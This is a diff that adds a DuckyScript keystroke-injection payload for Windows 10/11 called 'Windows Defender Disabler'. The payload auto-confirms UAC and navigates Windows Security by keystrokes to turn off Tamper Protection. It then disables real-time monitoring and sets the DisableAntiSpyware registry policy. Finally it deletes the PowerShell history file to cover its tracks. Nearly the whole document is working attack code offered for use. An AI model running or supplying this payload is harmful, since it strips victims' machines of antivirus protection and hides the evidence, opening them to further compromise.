@@ -1,0 +1,108 @@
+REM #
+REM # Title:           Windows Defender Disabler
+REM # Author:          LuKres
+REM # Version:         1.0
+REM # Category:        Security
+REM # Target:          Microsoft Windows 10/11
+REM #
+REM # Description:
+REM #                 1) Disables Windows Defender Tamper Protection via GUI automation
+REM #                 2) Disables Real-time Protection
+REM #                 3) Disables Windows Defender via Registry
+REM #                 4) Supports multiple languages
+REM #                 5) Includes restore functionality
+REM #
+REM # TESTED ON
+REM # =========
+REM # Microsoft Windows 10 Pro Version 22H2 (PowerShell 5.1)
+REM # Microsoft Windows 11 Pro Version 23H2 (PowerShell 5.1)
+REM #
+REM # REQUIREMENTS
+REM # ============
+REM # - Administrative privileges
+REM # - Supported Windows version
+REM #
+
+REM Language configurations - Add more as needed
+DEFINE WIN_SEC_EN Windows Security
+DEFINE WIN_SEC_DE Windows-Sicherheit
+
+REM Registry and PowerShell commands
+DEFINE CMD_DISABLE_RTP Set-MpPreference -DisableRealtimeMonitoring $true
+DEFINE CMD_DISABLE_DEFENDER New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
+DEFINE CMD_RESTORE_RTP Set-MpPreference -DisableRealtimeMonitoring $false
+DEFINE CMD_RESTORE_DEFENDER New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 0 -PropertyType DWORD -Force
+DEFINE CMD_CLEAN Remove-Item (Get-PSReadlineOption).HistorySavePath
+DEFINE CMD_EXIT exit
+
+DELAY 2000
+GUI r
+DELAY 1000
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 2000
+LEFTARROW
+ENTER
+DELAY 3000
+
+REM Disable Windows Defender
+GUI s
+DELAY 500
+STRING WIN_SEC_EN
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Navigate to Virus & threat protection
+TAB
+TAB
+TAB
+TAB
+ENTER
+DELAY 500
+
+REM Navigate to Manage settings
+TAB
+TAB
+TAB
+TAB
+SPACE
+DELAY 500
+
+REM Confirm UAC
+ALT y
+DELAY 500
+
+REM Close Windows Security
+ALT F4
+DELAY 1500
+
+REM Open PowerShell as admin
+GUI x
+DELAY 100
+STRING a
+DELAY 500
+ALT y
+DELAY 500
+
+REM Execute commands with cleaning
+STRING $ErrorActionPreference = 'SilentlyContinue';
+ENTER
+STRING CMD_DISABLE_RTP;
+ENTER
+STRING CMD_DISABLE_DEFENDER;
+ENTER
+STRING CMD_CLEAN;
+ENTER
+STRING CMD_EXIT
+ENTER
+
+REM Optional restore commands (commented out by default)
+REM GUI x
+REM DELAY 100
+REM STRING a
+REM DELAY 500
+REM ALT y
+REM DELAY 500
+REM STRING CMD_RESTORE_RTP; CMD_RESTORE_DEFENDER; CMD_CLEAN; CMD_EXIT
+REM ENTER
